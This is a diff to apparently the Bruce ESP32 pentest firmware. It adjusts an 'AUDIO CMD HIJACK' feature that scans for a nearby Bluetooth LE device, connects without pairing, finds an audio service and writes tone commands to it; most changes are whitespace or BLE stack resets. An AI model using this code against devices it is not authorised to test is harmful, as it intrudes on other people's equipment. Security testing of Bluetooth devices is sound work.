@@ -15,9 +15,9 @@ void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pChar
 
 void AudioCommandService::begin() {
     if(isRunning) return;
-    
+
     initNimBLEIfNeeded("audio_cmd");
-    
+
     pServer = NimBLEDevice::createServer();
     pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
     pAudioCmdChar = pService->createCharacteristic(
@@ -66,9 +66,9 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, 60);
     tft.print("Connecting...");
-    
+
     initNimBLEIfNeeded();
-    
+
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient->connect(target)) {
         displayMessage("Failed to connect", "", "", "", TFT_WHITE);
@@ -79,7 +79,7 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     tft.print("Connected");
     tft.setCursor(20, 100);
     tft.print("Discovering...");
-    
+
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
     if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
     if(!pService) {
@@ -92,7 +92,7 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     tft.print("Audio service found");
     tft.setCursor(20, 140);
     tft.print("Sending tones...");
-    
+
     uint16_t tones[] = {440, 550, 660, 770};
     for(int i = 0; i < 4; i++) {
         uint8_t toneCmd[7] = {
@@ -114,10 +114,22 @@ void audioCommandHijackTest() {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("AUDIO CMD HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    
+    NimBLEDevice::deinit(true);
+    delay(500);
+    initNimBLEIfNeeded("audio_hijack");
+    
     String selectedMAC = selectTargetFromScan("SELECT TARGET");
     if(selectedMAC.isEmpty()) return;
+    
     NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
+    
     if(!requireSimpleConfirmation("Start audio CMD hijack?")) return;
+    
+    NimBLEDevice::deinit(true);
+    delay(500);
+    initNimBLEIfNeeded("audio_client");
+    
     bool success = attemptAudioCommandHijack(target);
     if(success) displayMessage("SUCCESS!", "Audio commands sent", "", "", TFT_GREEN);
     else displayMessage("FAILED", "No audio service", "", "", TFT_RED);
